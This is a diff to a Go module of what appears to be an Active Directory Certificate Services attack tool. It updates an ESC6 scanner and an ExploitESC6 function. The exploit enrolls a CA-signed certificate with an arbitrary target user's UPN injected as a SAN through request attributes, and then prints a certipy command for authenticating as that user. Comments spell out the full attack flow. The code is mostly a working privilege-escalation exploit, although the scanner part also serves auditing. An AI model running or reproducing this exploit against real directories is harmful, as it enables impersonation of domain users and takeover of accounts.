@@ -2,62 +2,63 @@ package pki
 
 import (
 	"crypto/ecdsa"
-	"crypto/elliptic"
-	"crypto/rand"
 	"crypto/x509"
 	"fmt"
 )
 
-// ctFlagEditfAttributeSubjectAltName2 is the msPKI-Certificate-Name-Flag bit
-// indicating the CA has EDITF_ATTRIBUTESUBJECTALTNAME2 enabled. When set, the
-// CA processes SAN extensions from the certificate request attributes,
-// regardless of the template's enrollee-supplies-subject setting.
-const ctFlagEditfAttributeSubjectAltName2 uint32 = 0x00040000
+// editfAttributeSubjectAltName2 is the EDITF_ATTRIBUTESUBJECTALTNAME2 flag bit
+// in the CA's EditFlags registry value (exposed via the enrollment service's
+// flags LDAP attribute). When set, the CA processes SAN extensions from
+// certificate request attributes, regardless of the template configuration.
+const editfAttributeSubjectAltName2 uint32 = 0x00040000
 
-// ESC6Finding records a template on a CA where EDITF_ATTRIBUTESUBJECTALTNAME2
-// is enabled — allowing any certificate request to include an arbitrary SAN
-// via request attributes, bypassing template restrictions.
+// ESC6Finding records a CA where EDITF_ATTRIBUTESUBJECTALTNAME2 is enabled —
+// allowing any certificate request to include an arbitrary SAN via request
+// attributes, bypassing template restrictions.
 type ESC6Finding struct {
-	TemplateName        string `json:"template_name"`
-	CertificateNameFlag uint32 `json:"certificate_name_flag"`
+	CAName       string   `json:"ca_name"`
+	CAHostname   string   `json:"ca_hostname"`
+	Flags        uint32   `json:"flags"`
+	Templates    []string `json:"templates,omitempty"`
 }
 
-// ScanESC6 detects ESC6 — templates where the CA has
-// EDITF_ATTRIBUTESUBJECTALTNAME2 enabled (bit 0x00040000 in
-// msPKI-Certificate-Name-Flag). This CA-level misconfiguration allows ANY
-// certificate request to specify an arbitrary Subject Alternative Name in the
-// request attributes, regardless of template settings.
+// ScanESC6 detects ESC6 — CAs where EDITF_ATTRIBUTESUBJECTALTNAME2 is enabled
+// in the enrollment service's flags attribute. This CA-level misconfiguration
+// allows ANY certificate request to specify an arbitrary Subject Alternative
+// Name in the request attributes, regardless of template settings.
 //
 // Attack flow:
-//  1. Attacker finds a template on a CA with EDITF_ATTRIBUTESUBJECTALTNAME2
+//  1. Attacker finds a CA with EDITF_ATTRIBUTESUBJECTALTNAME2 enabled
 //  2. Attacker requests a cert and includes a SAN for a target user in request attributes
 //  3. The CA processes the SAN attribute and embeds it in the issued certificate
 //  4. Attacker authenticates via PKINIT as the target user
 func ScanESC6(cfg *ADCSConfig) ([]ESC6Finding, error) {
-	fmt.Println("[*] Scanning for ESC6 (EDITF_ATTRIBUTESUBJECTALTNAME2)...")
+	fmt.Println("[*] Scanning for ESC6 (EDITF_ATTRIBUTESUBJECTALTNAME2 on CA enrollment service)...")
 
-	templates, err := EnumerateTemplates(cfg)
+	services, err := EnumerateEnrollmentServices(cfg)
 	if err != nil {
-		return nil, fmt.Errorf("enumerate templates: %w", err)
+		return nil, fmt.Errorf("enumerate enrollment services: %w", err)
 	}
 
 	var findings []ESC6Finding
-	for _, tmpl := range templates {
-		if tmpl.CertificateNameFlag&ctFlagEditfAttributeSubjectAltName2 != 0 {
+	for _, svc := range services {
+		if svc.Flags&editfAttributeSubjectAltName2 != 0 {
 			finding := ESC6Finding{
-				TemplateName:        tmpl.Name,
-				CertificateNameFlag: tmpl.CertificateNameFlag,
+				CAName:     svc.Name,
+				CAHostname: svc.DNSHostName,
+				Flags:      svc.Flags,
+				Templates:  svc.Templates,
 			}
 			findings = append(findings, finding)
-			fmt.Printf("[!] ESC6: Template %q has EDITF_ATTRIBUTESUBJECTALTNAME2 (flag=0x%08X)\n",
-				tmpl.Name, tmpl.CertificateNameFlag)
-			fmt.Printf("[*]   Any request to this template can include an arbitrary SAN\n")
-			fmt.Printf("[*]   Authentication EKU: %v\n", tmpl.AuthenticationEKU)
+			fmt.Printf("[!] ESC6: CA %q has EDITF_ATTRIBUTESUBJECTALTNAME2 (flags=0x%08X)\n",
+				svc.Name, svc.Flags)
+			fmt.Printf("[*]   Any request to this CA can include an arbitrary SAN via request attributes\n")
+			fmt.Printf("[*]   Hostname: %s\n", svc.DNSHostName)
 		}
 	}
 
 	if len(findings) == 0 {
-		fmt.Println("[*] No ESC6 findings — no templates with EDITF_ATTRIBUTESUBJECTALTNAME2.")
+		fmt.Println("[*] No ESC6 findings — no CAs with EDITF_ATTRIBUTESUBJECTALTNAME2.")
 	} else {
 		fmt.Printf("[!] ESC6: %d finding(s) detected\n", len(findings))
 	}
@@ -73,51 +74,48 @@ func ScanESC6(cfg *ADCSConfig) ([]ESC6Finding, error) {
 func ExploitESC6(cfg *ADCSConfig, templateName, targetUPN string) (*x509.Certificate, *ecdsa.PrivateKey, error) {
 	fmt.Printf("[!] ESC6 Exploitation: template=%s target=%s\n", templateName, targetUPN)
 
-	// Step 1: Verify the template has EDITF_ATTRIBUTESUBJECTALTNAME2
+	// Step 1: Verify a CA has EDITF_ATTRIBUTESUBJECTALTNAME2 enabled
+	findings, err := ScanESC6(cfg)
+	if err != nil {
+		return nil, nil, fmt.Errorf("ESC6 scan: %w", err)
+	}
+	if len(findings) == 0 {
+		return nil, nil, fmt.Errorf("no CAs with EDITF_ATTRIBUTESUBJECTALTNAME2 found")
+	}
+
+	fmt.Printf("[+] CA %q confirmed ESC6 vulnerable (flags=0x%08X)\n", findings[0].CAName, findings[0].Flags)
+	fmt.Printf("[*] SAN will be injected via request attributes (CA-level processing)\n")
+
+	// Step 2: Verify the template exists
 	templates, err := EnumerateTemplates(cfg)
 	if err != nil {
 		return nil, nil, fmt.Errorf("enumerate templates: %w", err)
 	}
 
-	var vulnTemplate *CertTemplate
-	for i, t := range templates {
+	found := false
+	for _, t := range templates {
 		if t.Name == templateName {
-			vulnTemplate = &templates[i]
+			found = true
+			fmt.Printf("[+] Template %q found (any template works with ESC6)\n", templateName)
+			fmt.Printf("[*] Authentication EKU: %v\n", t.AuthenticationEKU)
+			fmt.Printf("[*] Manager approval: %v\n", t.RequiresManagerApproval)
 			break
 		}
 	}
-	if vulnTemplate == nil {
+	if !found {
 		return nil, nil, fmt.Errorf("template %q not found", templateName)
 	}
 
-	// Verify ESC6 condition: EDITF_ATTRIBUTESUBJECTALTNAME2 flag
-	if vulnTemplate.CertificateNameFlag&ctFlagEditfAttributeSubjectAltName2 == 0 {
-		return nil, nil, fmt.Errorf("template %q does not have EDITF_ATTRIBUTESUBJECTALTNAME2 (flag=0x%08X)",
-			templateName, vulnTemplate.CertificateNameFlag)
-	}
-
-	fmt.Printf("[+] Template %q confirmed ESC6 vulnerable\n", templateName)
-	fmt.Printf("[*] CertificateNameFlag: 0x%08X (EDITF_ATTRIBUTESUBJECTALTNAME2 set)\n", vulnTemplate.CertificateNameFlag)
-	fmt.Printf("[*] Authentication EKU: %v\n", vulnTemplate.AuthenticationEKU)
-	fmt.Printf("[*] Manager approval: %v\n", vulnTemplate.RequiresManagerApproval)
-	fmt.Printf("[*] SAN will be injected via request attributes (CA-level processing)\n")
-
-	// Step 2: Generate signing key and forge certificate with target UPN
-	// The key difference from ESC1: in a real enrollment, the SAN is specified
-	// in the request attributes (san:upn=target@domain) rather than through the
-	// template's enrollee-supplies-subject mechanism. The CA's EDITF flag causes
-	// it to copy the SAN from request attributes into the issued certificate.
-	signingKey, err := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
+	// Step 3: Enroll for a CA-signed certificate with target UPN injected via
+	// request attributes. The sanInject=true flag puts the SAN in CertAttrib
+	// (SAN:upn=<targetUPN>) rather than in the CSR itself. The CA's EDITF flag
+	// causes it to copy the SAN from request attributes into the issued certificate.
+	cert, certKey, err := EnrollCertificate(cfg, templateName, targetUPN, true)
 	if err != nil {
-		return nil, nil, fmt.Errorf("generate signing key: %w", err)
+		return nil, nil, fmt.Errorf("enrollment failed: %w", err)
 	}
 
-	cert, certKey, err := ForgeCertificate(signingKey, targetUPN)
-	if err != nil {
-		return nil, nil, fmt.Errorf("forge cert: %w", err)
-	}
-
-	fmt.Printf("[+] Forged certificate for %s via ESC6 on template %q\n", targetUPN, templateName)
+	fmt.Printf("[+] Certificate obtained for %s via ESC6 on CA %q using template %q\n", targetUPN, findings[0].CAName, templateName)
 	fmt.Printf("[*] SAN injected via EDITF_ATTRIBUTESUBJECTALTNAME2 CA policy\n")
 	fmt.Printf("[*] Next steps:\n")
 	fmt.Printf("    certipy auth -pfx cert.pfx -dc-ip %s\n", cfg.TargetDC)
